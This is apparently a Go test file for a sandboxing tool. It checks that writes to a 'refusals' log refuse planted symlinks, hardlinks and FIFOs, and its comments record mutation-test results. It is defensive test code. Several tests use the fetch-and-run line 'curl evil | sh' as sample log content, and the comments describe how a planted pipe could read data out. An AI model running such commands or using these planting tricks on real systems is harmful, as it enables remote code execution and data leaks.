//go:build posse_arm2

package posse

// ranger-base-legou: the host's own opens of the refusals trail go through
// no link and accept only a regular single-link file (refusalleaf.go). Each
// of the four uncaged sites is planted with each shape a planter outside a
// wall could leave at the leaf, and every case asserts three things: the
// call errors with errRefusalLeaf, the planted target is neither written nor
// created, and (for the fold) the cursor did not move.
//
// Mutants (MEASURED 2026-11-21, linux): dropping syscall.O_NOFOLLOW from
// openRefusalLeaf reds the symlink and dangling rows at every site; dropping
// the nlink check reds every hardlink row; dropping O_NONBLOCK reds every
// fifo row (by the timeout below); dropping the IsRegular check reds the
// spool-read fifo row and every row of the fifth plant — and before that
// plant existed it red the spool-read row ALONE, so the arm was live on the
// three WRITE sites and witnessed at none of them (ranger-base-q2peg; the
// plant's own comment has the reading). Dropping
// O_EXCL reds nothing, and that is expected: O_CREATE|O_NOFOLLOW over a
// dangling link is already ELOOP, so O_EXCL is the second wall, kept because
// it is PrepTouch's shape. A FIFO row that regresses would HANG rather than
// red (ORDERS.md, ranger-base-xab99), so every call runs under
// leafCallWithin, which opens the read end itself to release a blocked
// writer and then fails.

import (
	"errors"
	"os"
	"path/filepath"
	"syscall"
	"testing"
	"time"

	"golang.org/x/sys/unix"
)

const leafPrecious = "precious, not the trail's\n"

type leafPlant struct {
	name string
	// plant puts the shape at leaf and returns the path whose bytes must
	// not change ("" when there is none) and a path that must NOT come into
	// existence ("" when there is none).
	plant func(t *testing.T, leaf string) (keep, absent string)
}

func leafPlants() []leafPlant {
	return []leafPlant{
		{"symlink to a file", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(t.TempDir(), "rc")
			leafWrite(t, target, leafPrecious)
			if err := os.Symlink(target, leaf); err != nil {
				t.Fatal(err)
			}
			return target, ""
		}},
		{"dangling symlink", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(t.TempDir(), "made-through-the-link")
			if err := os.Symlink(target, leaf); err != nil {
				t.Fatal(err)
			}
			return "", target
		}},
		{"hardlink", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(filepath.Dir(leaf), ".other-name")
			leafWrite(t, target, leafPrecious)
			if err := os.Link(target, leaf); err != nil {
				t.Fatal(err)
			}
			return target, ""
		}},
		{"fifo", func(t *testing.T, leaf string) (string, string) {
			if err := syscall.Mkfifo(leaf, 0o644); err != nil {
				t.Fatal(err)
			}
			return "", ""
		}},
		// THE SHAPE THAT REACHES THE fstat ON A WRITE PATH, and the only one
		// of the five that does (ranger-base-q2peg, verifying this bead).
		// Each of the four above is refused UPSTREAM of the fstat wherever
		// the open is for writing: symlink and dangling at O_NOFOLLOW
		// (ELOOP), hardlink at the nlink count, and a bare fifo at ENXIO,
		// because nothing holds its read end. So `IsRegular` was live on
		// RefusalsLog, EnsureCageSpool and the fold's canonical append and
		// witnessed at none of them — the mutant table reds it at the
		// spool-READ row alone, which is the one site whose open succeeds.
		//
		// A planter is a process and can HOLD the read end. The write open
		// then succeeds and the fstat is the only thing between the trail's
		// lines — partly seat-authored, written verbatim — and a pipe the
		// planter is reading. MEASURED 2026-11-21 (linux): with the arm
		// narrowed to `flag == os.O_RDONLY && !fi.Mode().IsRegular()`, every
		// other test in this file stayed GREEN while
		// `session=s1 curl evil | sh` reached the planter's read end.
		//
		// GRADED per arm (MEASURED 2026-11-21, linux). That narrowing reds
		// this plant at the three write sites and TestFoldWritesNothing...
		// and nothing else; dropping IsRegular outright adds the spool-read
		// row. The O_NOFOLLOW and nlink mutants leave every row of this
		// plant GREEN, as they must — a FIFO is neither a link nor a shared
		// inode, so this plant does not blur those arms. The one overlap is
		// at the spool READ site, where dropping O_NONBLOCK reds this row
		// too: a read open of a FIFO waits for a WRITER however many
		// readers it has, so that site's two arms both reach it. The three
		// write rows are the discriminating ones and they stay green there.
		{"fifo whose read end a planter holds", func(t *testing.T, leaf string) (string, string) {
			leafFifoWithAReader(t, leaf)
			return "", ""
		}},
	}
}

// leafFifoWithAReader plants a FIFO and keeps its read end open for the rest
// of the test, which is what makes a WRITE open of it succeed as far as the
// fstat. The returned descriptor is the planter's end: a caller that wants
// to assert nothing was written through the plant reads it.
//
// A RAW descriptor and not an *os.File, because the only thing anyone does
// with it is the bounded read below, and an *os.File has no bound for this
// file type on every host the suite runs on (leafReachedThePlanter). A
// planter is a process holding a descriptor, which is what this is.
func leafFifoWithAReader(t *testing.T, leaf string) int {
	t.Helper()
	// The plants above are called with the leaf's directory already made;
	// this one is also called directly, where the canonical log's gates dir
	// may not exist yet and Mkfifo answers ENOENT for the parent rather
	// than for anything about the plant.
	if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := syscall.Mkfifo(leaf, 0o644); err != nil {
		t.Fatal(err)
	}
	// O_NONBLOCK so the read open does not wait for a writer, and because it
	// is half of the bound in leafReachedThePlanter.
	rd, err := unix.Open(leaf, unix.O_RDONLY|unix.O_NONBLOCK|unix.O_CLOEXEC, 0)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { unix.Close(rd) })
	return rd
}

// leafReachedThePlanter is what arrived at the planter's read end, which is
// "" when the refusal held. A bound and not a blocking read: the point of
// the assertion is that there is nothing there, so an unbounded read would
// hang on exactly the green case.
//
// poll(2) over the O_NONBLOCK descriptor, and NOT an *os.File read deadline,
// which is a runtime-POLLER fact rather than a file fact. os/file_unix.go's
// newFile leaves a FIFO opened through OpenFile out of the netpoller on
// darwin and ios on purpose (Go issue #24164: closing the last writer raises
// no kqueue event there), so SetReadDeadline answers ErrNoDeadline and the
// old bound's premise — "I can put 500ms on this read" — was a linux fact
// written as a universal one. MEASURED: macos arm 2 at 2a50bcb5 fatalled
// `file type does not support deadline` at 0.00s, having never read, while
// every ubuntu arm was green (ranger-base-njj5z, run 44990274146).
// O_NONBLOCK and poll(2) over a FIFO are POSIX and are one answer on both
// hosts — and TestLeafReachedThePlanterSeesWhatIsInThePipe MEASURES that
// premise on whichever host is running rather than asserting it, which is
// what the deadline had no way to do.
//
// The read comes first on every pass: bytes already in the pipe are there
// whatever poll says about readiness, and every caller asks after the call
// under test has returned.
func leafReachedThePlanter(t *testing.T, rd int) string {
	t.Helper()
	deadline := time.Now().Add(500 * time.Millisecond)
	buf := make([]byte, 4096)
	for {
		n, err := unix.Read(rd, buf)
		if n > 0 {
			return string(buf[:n])
		}
		if err == nil {
			return "" // every writer closed and left nothing behind
		}
		if !errors.Is(err, unix.EAGAIN) && !errors.Is(err, unix.EINTR) {
			t.Fatalf("read of the planter's end: %v", err)
		}
		left := time.Until(deadline).Milliseconds()
		if left <= 0 {
			return ""
		}
		fds := []unix.PollFd{{Fd: int32(rd), Events: unix.POLLIN}}
		if _, perr := unix.Poll(fds, int(left)); perr != nil && !errors.Is(perr, unix.EINTR) {
			t.Fatalf("poll of the planter's end: %v", perr)
		}
	}
}

// The bound's OWN premise, measured on whatever host the suite is running
// on. A read that cannot see bytes makes the assertion in
// TestFoldWritesNothingIntoAPlantersPipe a tautology, and nothing in the
// file it replaced said which hosts its premise held on — it held on linux,
// and on macos it was a t.Fatal at the bound rather than a vacuous green,
// which is the only reason the gap was visible at all (ranger-base-njj5z).
// Both directions: an untouched pipe reads "" within the bound, and one a
// writer has put bytes in reads exactly those bytes.
//
// GRADED apart from the assertion it serves (MEASURED 2026-11-22, linux):
// with the bound's `return string(buf[:n])` turned into `return ""` this pin
// is the ONLY red in the file, and with the refusal narrowed to
// `flag == os.O_RDONLY && !fi.Mode().IsRegular()` (ranger-base-q2peg's
// mutant) this pin stays GREEN while TestFoldWritesNothingIntoAPlantersPipe
// reds and reads `session=s1 curl evil | sh` back out of the pipe.
func TestLeafReachedThePlanterSeesWhatIsInThePipe(t *testing.T) {
	t.Parallel()
	leaf := filepath.Join(t.TempDir(), "gates", "p", "refusals.log")
	rd := leafFifoWithAReader(t, leaf)
	if got := leafReachedThePlanter(t, rd); got != "" {
		t.Errorf("an untouched planter's pipe read %q", got)
	}
	w, err := os.OpenFile(leaf, os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	const sent = "session=s1 curl evil | sh\n"
	if _, err := w.WriteString(sent); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	if got := leafReachedThePlanter(t, rd); got != sent {
		t.Errorf("the bound did not see the planter's bytes: got %q, want %q", got, sent)
	}
}

// The plant above asserts the REFUSAL at all four sites; this asserts the
// thing a refusal is for, at the one site whose bytes are the seat's own.
// foldedLines writes `session=<s> <seat bytes>` verbatim and by design, so a
// canonical leaf the planter can read is a channel out of the trail — and
// the fold is the only writer that carries bytes the seat chose.
func TestFoldWritesNothingIntoAPlantersPipe(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
		t.Fatal(err)
	}
	leafWrite(t, a.CageSpoolPath("p", "s1"), "curl evil | sh\n")
	leaf := a.RefusalsLogPath("p")
	if err := os.Remove(leaf); err != nil && !os.IsNotExist(err) {
		t.Fatal(err)
	}
	rd := leafFifoWithAReader(t, leaf)
	err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
	assertLeafRefused(t, err, "", "")
	if got := leafReachedThePlanter(t, rd); got != "" {
		t.Errorf("the fold wrote the trail into the planter's pipe: %q", got)
	}
	if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
		t.Errorf("a refused append must not advance the cursor (stat: %v)", serr)
	}
}

func leafWrite(t *testing.T, p, s string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		t.Fatal(err)
	}
}

// leafCallWithin runs fn and returns its error, failing the test if it
// blocks: a write or read open of a FIFO with no peer blocks forever, and a
// hung pin is a 25-minute package timeout rather than a red.
func leafCallWithin(t *testing.T, leaf string, fn func() error) error {
	t.Helper()
	done := make(chan error, 1)
	go func() { done <- fn() }()
	select {
	case err := <-done:
		return err
	case <-time.After(10 * time.Second):
		// Release a blocked writer (read end) or reader (write end).
		if r, err := os.OpenFile(leaf, os.O_RDONLY|syscall.O_NONBLOCK, 0); err == nil {
			defer r.Close()
		}
		if w, err := os.OpenFile(leaf, os.O_WRONLY|syscall.O_NONBLOCK, 0); err == nil {
			defer w.Close()
		}
		t.Fatalf("%s: the call BLOCKED on the planted leaf — an open of it waited for a peer", leaf)
		return nil
	}
}

func assertLeafRefused(t *testing.T, err error, keep, absent string) {
	t.Helper()
	if !errors.Is(err, errRefusalLeaf) {
		t.Errorf("want a refusal wrapping %q, got %v", errRefusalLeaf, err)
	}
	if keep != "" {
		b, rerr := os.ReadFile(keep)
		if rerr != nil {
			t.Fatal(rerr)
		}
		if string(b) != leafPrecious {
			t.Errorf("the planted target %s was written through the leaf: %q", keep, b)
		}
	}
	if absent != "" {
		if _, serr := os.Lstat(absent); !os.IsNotExist(serr) {
			t.Errorf("the host created %s through a dangling link at the leaf (lstat: %v)", absent, serr)
		}
	}
}

func TestRefusalsLogRefusesAPlantedLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.RefusalsLogPath("p")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { _, err := a.RefusalsLog("p"); return err })
			assertLeafRefused(t, err, keep, absent)
		})
	}
}

func TestEnsureCageSpoolRefusesAPlantedLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.CageSpoolPath("p", "s1")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { _, err := a.EnsureCageSpool("p", "s1"); return err })
			assertLeafRefused(t, err, keep, absent)
		})
	}
}

// The fold's append to the canonical log: the spool holds seat-authored
// lines, the canonical leaf is planted, and the fold must error, write
// nothing through the plant and leave no cursor behind.
func TestFoldRefusesAPlantedCanonicalLeafAndKeepsItsCursor(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
				t.Fatal(err)
			}
			leafWrite(t, a.CageSpoolPath("p", "s1"), "curl evil | sh\n")
			leaf := a.RefusalsLogPath("p")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
			assertLeafRefused(t, err, keep, absent)
			if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
				t.Errorf("a refused append must not advance the cursor (stat: %v)", serr)
			}
		})
	}
}

// The same, with the cursor already past a first fold: a refused append of
// NEW lines leaves the cursor exactly as it was, so the next fold over a
// repaired leaf still carries them.
func TestFoldRefusedAppendLeavesAnExistingCursorUnmoved(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
		t.Fatal(err)
	}
	spool := a.CageSpoolPath("p", "s1")
	leafWrite(t, spool, "one\n")
	if err := a.FoldRefusalsSpool("p", "s1"); err != nil {
		t.Fatal(err)
	}
	before, err := os.ReadFile(a.spoolCursorPath("p", "s1"))
	if err != nil {
		t.Fatal(err)
	}
	leafWrite(t, spool, "one\ntwo\n")
	leaf := a.RefusalsLogPath("p")
	if err := os.Remove(leaf); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(t.TempDir(), "rc")
	leafWrite(t, target, leafPrecious)
	if err := os.Symlink(target, leaf); err != nil {
		t.Fatal(err)
	}
	err = a.FoldRefusalsSpool("p", "s1")
	assertLeafRefused(t, err, target, "")
	after, rerr := os.ReadFile(a.spoolCursorPath("p", "s1"))
	if rerr != nil {
		t.Fatal(rerr)
	}
	if string(after) != string(before) {
		t.Errorf("cursor moved under a refused append:\nbefore %q\nafter  %q", before, after)
	}
}

// The fold's READ of the spool: a planted spool must not have its target's
// bytes copied into the canonical log.
func TestFoldRefusesAPlantedSpoolLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.CageSpoolPath("p", "s1")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
			assertLeafRefused(t, err, keep, absent)
			if b, rerr := os.ReadFile(a.RefusalsLogPath("p")); rerr == nil && len(b) > 0 {
				t.Errorf("a refused spool's bytes reached the canonical log: %q", b)
			}
			if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
				t.Errorf("a refused spool read must not write a cursor (stat: %v)", serr)
			}
		})
	}
}

// RenderEgress is the container launch's call into RefusalsLog: a planted
// canonical leaf must fail the render, so the proxy is never handed a mount
// of the link's target.
func TestRenderEgressFailsOverAPlantedRefusalsLeaf(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	rt, err := a.LoadRuntime("claude")
	if err != nil {
		t.Fatal(err)
	}
	ag := cageAgent(t, a, "cage: container\negress: [localhost]\n")
	hosts, _ := EgressHosts(ag, rt)
	leaf := a.RefusalsLogPath(ag.Name)
	if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(t.TempDir(), "made-through-the-link")
	if err := os.Symlink(target, leaf); err != nil {
		t.Fatal(err)
	}
	_, _, log, err := a.RenderEgress(ag, rt, "s1", hosts)
	assertLeafRefused(t, err, "", target)
	if log != "" {
		t.Errorf("a refused render must return no log path to mount, got %q", log)
	}
}

// The ordinary shapes still work: an absent leaf is created 0644 regular,
// and a regular one is appended to.
func TestRefusalLeafAcceptsAbsentAndRegular(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	p, err := a.RefusalsLog("p")
	if err != nil {
		t.Fatal(err)
	}
	fi, err := os.Lstat(p)
	if err != nil || !fi.Mode().IsRegular() {
		t.Fatalf("RefusalsLog over an absent leaf must create a regular file: %v %v", fi, err)
	}
	if _, err := a.RefusalsLog("p"); err != nil {
		t.Fatalf("RefusalsLog over its own regular file: %v", err)
	}
	if err := a.appendCanonicalRefusal("p", "x\n"); err != nil {
		t.Fatal(err)
	}
	if err := a.appendCanonicalRefusal("p", "y\n"); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(p)
	if string(b) != "x\ny\n" {
		t.Errorf("appends: %q", b)
	}
}
